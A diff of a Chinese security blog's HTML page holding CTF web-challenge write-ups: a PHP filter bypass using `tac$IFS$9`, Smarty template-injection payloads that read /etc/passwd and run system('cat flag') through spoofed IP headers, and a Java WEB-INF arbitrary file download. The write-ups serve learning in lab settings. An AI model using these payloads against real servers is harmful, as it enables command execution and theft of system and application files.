class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>第三层过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(!strstr($get_flag,&quot; &quot;))&#123;</span><br><span class="line">        $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag);</span><br></pre></td></tr></table></figure>
+<p>这里过滤了空格和cat，所以，我们可以用$IFS$9来代替空格，而tac来代替cat，所以构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num=2e5&amp;md5=0e215962017&amp;get_flag=tac$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
   
     <article id="post-unicode编码安全问题" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -1090,168 +1270,6 @@ while count==1:
       
 	<div class="article-tag tagcloud">
 		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SSTI/" rel="tag">SSTI</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-smart模板漏洞" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/08/31/smart%E6%A8%A1%E6%9D%BF%E6%BC%8F%E6%B4%9E/" class="article-date">
-  	<time datetime="2021-08-30T16:00:00.000Z" itemprop="datePublished">2021-08-31</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/31/smart%E6%A8%A1%E6%9D%BF%E6%BC%8F%E6%B4%9E/">
-        smarty模板漏洞
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="smarty模板漏洞"><a href="#smarty模板漏洞" class="headerlink" title="smarty模板漏洞"></a>smarty模板漏洞</h1><p>打开主页，我们观察了各页面的内容，其中Your ip:让我们产生怀疑，会不会是SSTI漏洞，我们抓取一个包，然后构造X-Forwarded-For或client-ip这两个字段</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">X-Foewarded-For: &#123;7*7&#125;</span><br><span class="line"></span><br><span class="line">client-ip: &#123;7*7&#125;</span><br></pre></td></tr></table></figure>
-<p>发现Your ip:会显示49，证明存在SSTI，而读取XFF和client-ip的api有些是使用smart引擎写的，因此我们可以猜测是smart模板漏洞，而常见是flask模板漏洞</p>
-<p>而smarty模板是基于PHP开发的，与flask模板有比较大的区别，我们可以使用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;$smarty.version&#125;</span><br></pre></td></tr></table></figure>
-<p>来确定smarty模板的版本</p>
-<h2 id="常见的利用方法"><a href="#常见的利用方法" class="headerlink" title="常见的利用方法"></a>常见的利用方法</h2><h3 id="php-php"><a href="#php-php" class="headerlink" title="{php}{/php}"></a>{php}{/php}</h3><p>smarty模板支持使用的{php}{/php}标签来执行被包裹的php指令，但在smart3版本中已经废弃了{php}{/php}标签，但是在smarty3.1中的smartyBC中仍然可以使用</p>
-<h3 id="literal"><a href="#literal" class="headerlink" title="{literal}"></a>{literal}</h3><p>{literal}可以让一个模板区域的字符原样输出，这经常保护页面上的javascript或css样本表，避免因为smarty的定界符错被解析</p>
-<p>对于php5的话，可以使用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt; phpinfo();&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>来实现php代码的执行</p>
-<h3 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h3><p>通过self来获取smarty类的静态方法来实现文件读写<br>smarty类中的getStreamVariable方法的代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public function getStreamVariable($variable)&#123; $_result = &#x27;&#x27;; $fp = fopen($variable, &#x27;r+&#x27;); if ($fp) &#123; while (!feof($fp) &amp;&amp; ($current_line = fgets($fp)) !== false) &#123; $_result .= $current_line; &#125; fclose($fp); return $_result; &#125; $smarty = isset($this-&gt;smarty) ? $this-&gt;smarty : $this; if ($smarty-&gt;error_unassigned) &#123; throw new SmartyException(&#x27;Undefined stream variable &quot;&#x27; . $variable . &#x27;&quot;&#x27;); &#125; else &#123; return null; &#125; &#125;</span><br></pre></td></tr></table></figure>
-
-<p>getStreamVariable()方法是读取一个文件并返回其内容，所以我们可以用self来获取smarty类对象并调用这个方法</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;file:///etc/passwd&quot;)&#125;</span><br></pre></td></tr></table></figure>
-<p>但这是旧版本的smarty模板的利用方法，新版本不能用，而smarty3.1.30版本开始，这个方法已经被删除，而Smarty_Internal_File类中的writeFile方法来写shell也已经被高版本删除</p>
-<h3 id="if"><a href="#if" class="headerlink" title="{if}"></a>{if}</h3><p>smarty模板的{if}标签和php的if很像，只是增加了一些特性，每个{if}要配备一个{/if}，也可以匹配{else}和{elseif}，全部的php条件表达式和函数都可以在if内使用，如or,and等</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if phpinfo()&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure>
-<p>即可显示php版本</p>
-<p>回到题目本身，我可以在bp抓的包中构造XFF或client-ip来获取flag或想要的信息</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &#123;if system(&quot;cat flag&quot;)&#125;&#123;/if&#125;</span><br><span class="line"></span><br><span class="line">client-ip: &#123;if system(&quot;cat flag&quot;)&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure>
-
-<p>详细请看：<a target="_blank" rel="noopener" href="https://www.freebuf.com/column/219913.html">https://www.freebuf.com/column/219913.html</a></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SSTI/" rel="tag">SSTI</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-java的WEB-INF" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/08/30/java%E7%9A%84WEB-INF/" class="article-date">
-  	<time datetime="2021-08-29T16:00:00.000Z" itemprop="datePublished">2021-08-30</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/30/java%E7%9A%84WEB-INF/">
-        java的WEB-INF
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="java的WEB-INF文件"><a href="#java的WEB-INF文件" class="headerlink" title="java的WEB-INF文件"></a>java的WEB-INF文件</h1><p>我们点击help，出现</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.io.FileNotFoundException:&#123;help.docx&#125;</span><br></pre></td></tr></table></figure>
-<p>而且payload为</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://url/Download?filename=文件名</span><br></pre></td></tr></table></figure>
-<p>可见可能是文件包含，可以用此下载文件，不过用get提交的方式不可以，所以此处我们可以试一下post提交，发现可以下载help.docx文件，而且用bp抓包，放到repeater后改为post提交，可以看见500状态码，即服务器内部出错，并爆出一些关键信息</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;title&gt;HTTP Status 500 – Internal Server Error&lt;/title&gt;&lt;style type=&quot;text/css&quot;&gt;h1 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;&#125; h2 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;&#125; h3 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;&#125; body &#123;font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;&#125; b &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;&#125; p &#123;font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;&#125; a &#123;color:black;&#125; a.name &#123;color:black;&#125; .line &#123;height:1px;background-color:#525D76;border:none;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 500 – Internal Server Error&lt;/h1&gt;&lt;hr class=&quot;line&quot; /&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt; Exception Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Description&lt;/b&gt; The server encountered an unexpected condition that prevented it from fulfilling the request.&lt;/p&gt;&lt;p&gt;&lt;b&gt;Exception&lt;/b&gt;&lt;/p&gt;&lt;pre&gt;java.lang.NullPointerException</span><br><span class="line">	java.io.FileInputStream.&amp;lt;init&amp;gt;(FileInputStream.java:130)</span><br><span class="line">	java.io.FileInputStream.&amp;lt;init&amp;gt;(FileInputStream.java:93)</span><br><span class="line">	com.wm.ctf.DownloadController.doPost(DownloadController.java:24)</span><br><span class="line">	javax.servlet.http.HttpServlet.service(HttpServlet.java:661)</span><br><span class="line">	javax.servlet.http.HttpServlet.service(HttpServlet.java:742)</span><br><span class="line">	org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)</span><br><span class="line">&lt;/pre&gt;&lt;p&gt;&lt;b&gt;Note&lt;/b&gt; The full stack trace of the root cause is available in the server logs.&lt;/p&gt;&lt;hr class=&quot;line&quot; /&gt;&lt;h3&gt;Apache Tomcat/8.5.24&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-<p>其中我们可以看见</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.wm.ctf.DownloadController.doPost(DownloadController.java:24)</span><br></pre></td></tr></table></figure>
-<p>而一般我们出于安全的考虑，我们会将网页放在WEB-INF文件下，防止页面被直接访问，而要访问WEB-INF文件下的网页，在WEB-INF文件下设置web.xml文件，其中web.xml的格式为：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--直接设置 welcome-file 节点--&gt;</span><br><span class="line">&lt;welcome-file&gt; ./WEB-INF/views/xxx.jsp&lt;/weclome-file&gt;</span><br></pre></td></tr></table></figure>
-<p>访问地址为：<a target="_blank" rel="noopener" href="http://url/xxx/%EF%BC%88xxx%E4%B8%BA%E9%A1%B9%E7%9B%AE%E5%90%8D%EF%BC%89">http://url/xxx/（xxx为项目名）</a></p>
-<p>因此，我们可以包含web.xml文件，即将help.docx改为web.xml进行post提交即可下载web.xml</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot; version=&quot;4.0&quot;&gt;</span><br><span class="line">&lt;welcome-file-list&gt;</span><br><span class="line">&lt;welcome-file&gt;Index&lt;/welcome-file&gt;</span><br><span class="line">&lt;/welcome-file-list&gt;</span><br><span class="line">&lt;servlet&gt;</span><br><span class="line">&lt;servlet-name&gt;IndexController&lt;/servlet-name&gt;</span><br><span class="line">&lt;servlet-class&gt;com.wm.ctf.IndexController&lt;/servlet-class&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">&lt;servlet-name&gt;IndexController&lt;/servlet-name&gt;</span><br><span class="line">&lt;url-pattern&gt;/Index&lt;/url-pattern&gt;</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br><span class="line">&lt;servlet&gt;</span><br><span class="line">&lt;servlet-name&gt;LoginController&lt;/servlet-name&gt;</span><br><span class="line">&lt;servlet-class&gt;com.wm.ctf.LoginController&lt;/servlet-class&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">&lt;servlet-name&gt;LoginController&lt;/servlet-name&gt;</span><br><span class="line">&lt;url-pattern&gt;/Login&lt;/url-pattern&gt;</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br><span class="line">&lt;servlet&gt;</span><br><span class="line">&lt;servlet-name&gt;DownloadController&lt;/servlet-name&gt;</span><br><span class="line">&lt;servlet-class&gt;com.wm.ctf.DownloadController&lt;/servlet-class&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">&lt;servlet-name&gt;DownloadController&lt;/servlet-name&gt;</span><br><span class="line">&lt;url-pattern&gt;/Download&lt;/url-pattern&gt;</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br><span class="line">&lt;servlet&gt;</span><br><span class="line">&lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;</span><br><span class="line">&lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">&lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;</span><br><span class="line">&lt;url-pattern&gt;/Flag&lt;/url-pattern&gt;</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure>
-<p>通过看</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;</span><br></pre></td></tr></table></figure>
-<p>可知FlagController.class文件放在WEB-INF/classes/com/wm/ctf/中</p>
-<p>WEB-INF主要包含的文件和目录</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则</span><br><span class="line">/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</span><br><span class="line">/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</span><br><span class="line">/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</span><br><span class="line">/WEB-INF/database.properties：数据库配置文件</span><br><span class="line">漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</span><br></pre></td></tr></table></figure>
-
-<p>所以可以和上面一样，包含FlagController.class文件，因此构造payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=/WEB-INF/classes/com/wm/ctf/FlagController.class</span><br></pre></td></tr></table></figure>
-<p>即可得到，里面的base64的码就是flag</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/java/" rel="tag">java</a></li></ul>
 	</div>
 
       
